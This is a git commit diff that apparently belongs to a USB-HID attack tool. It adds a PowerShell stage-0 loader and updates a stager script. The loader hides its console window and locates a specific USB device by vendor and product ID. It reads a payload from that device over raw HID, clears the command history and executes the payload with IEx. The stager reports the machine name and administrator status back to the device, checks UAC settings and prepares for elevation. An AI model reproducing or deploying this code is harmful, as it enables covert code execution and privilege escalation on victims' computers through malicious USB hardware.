7d0ae9890639c91cc5d9fce1a1c3b73a15451e27
slango20 <slango22@gmail.com>
2017-02-23 22:46:23 -0500

    Updated earlier payloads to use RawHID interface

---
+++ payloads/stage0.ps1
@@ -0,0 +1,39 @@
+$u=$Host.UI.RawUI
+$u.ForegroundColor='White'
+Clear
+
+$u.WindowTitle=''
+$M=64
+$cs='
+using System;
+using System.IO;
+using Microsoft.Win32.SafeHandles;
+using System.Runtime.InteropServices;
+namespace n{public class w{[DllImport(%kernel32.dll%)]
+public static extern SafeFileHandle CreateFile(String x,UInt32 d,Int32 s,IntPtr a,Int32 c,uint b,IntPtr t);
+[DllImport(%user32.dll%)]
+public static extern bool ShowWindowAsync(IntPtr h,int c);
+[DllImport(%user32.dll%)]
+public static extern IntPtr SetWindowPos(IntPtr h,int i,int x,int Y,int c,int j,int w);
+
+public static FileStream o(string f){return new FileStream(CreateFile(f,0XC0000000U,3,IntPtr.Zero,3,0x40000000,IntPtr.Zero),FileAccess.ReadWrite,9,true);}}}'.Replace('%',[char]34)
+Add-Type -TypeDefinition $cs
+$h=(Get-Process -Id $pid).MainWindowHandle
+$null=[n.w]::SetWindowPos($h,-2,200,200,40,40,5)
+
+function x(){$null=[n.w]::ShowWindowAsync($h,6)
+$d=gwmi Win32_USBControllerDevice
+foreach($h in $d){$w=[wmi]$h.Dependent
+if($w.GetPropertyValue('DeviceID')-match('1209&PID_6667')-and($w.GetPropertyValue('Service')-eq$null)){$fn=([char]92+[char]92+'?'+[char]92+$w.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35)+[char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')}}try{$f=[n.w]::o($fn)
+$g=$e=0
+$s=New-Object IO.MemoryStream
+do{$b=New-Object Byte[]($M+1)
+$f.Write($b,0,$M+1)
+$r=$f.Read($b,0,$M+1)
+if($b[1]-gt0){$s.Write($b,2,$b[1])
+$g+=$b[1]
+$a=$s.ToArray()
+if($e-eq0-and$g-gt2){$e=($a[0]*256)+$a[1]}}}while($g-lt$e+2-or$e-eq0)
+clhy
+IEx([Text.Encoding]::ASCII).GetString($a,2,$e)}catch{}exit}x
+
--- payloads/stager.ps1
+++ payloads/stager.ps1
@@ -1,16 +1,13 @@
-$comport = Get-WmiObject Win32_SerialPort | Select-Object Name,DeviceID,Description | where {$_.Description -like "*Teensy*"} | % {$_.inputobject.DeviceID}
 function Run-Stager {
-$port=New-Object System.IO.Ports.SerialPort $comport,115200,None,8,one
-$port.open()
-$port.WriteLine("init")
-$resp=$port.ReadLine()
+[ps]::[sploit]::init()
+[ps]::[sploit]::Write("init")
+$resp=[ps]::[sploit]::Read()
 if (-Not $resp -eq "ack") {return}
-$port.WriteLine($env:computername)
-$port.WriteLine($comport)
+[ps]::[sploit]::Write($env:computername)
 $uac=Get-RegistryValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ConsentPromptBehaviorAdmin
 Write-Host $uac
 $admin=([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] “Administrator”)
-$port.WriteLine($admin)
+[ps]::[sploit]::Write($admin)
 if (-Not $admin) { #teensy will attempt to create elevated instance if not already
   $port.close() #let go of port
   return #in case I decide to add more data return later
